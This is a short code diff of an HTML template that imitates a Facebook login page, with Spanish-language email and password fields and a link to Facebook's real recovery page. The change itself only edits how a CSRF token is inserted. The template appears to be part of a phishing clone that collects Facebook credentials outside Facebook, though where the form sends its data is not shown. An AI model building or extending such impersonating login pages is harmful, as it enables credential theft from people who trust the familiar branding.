@@ -19,7 +19,7 @@
         <span class="login">Login to Facebook</span>
         <input type="email" name="email" id="email" placeholder="Correo electrónico o número de teléfono" required>
         <input type="password" name="pass" id="pass" placeholder="Contraseña" required>
-        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
         <button type="submit" class="login-btn">Iniciar Sesión</button>
         <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">¿Olvidaste
           tu contraseña?</a>
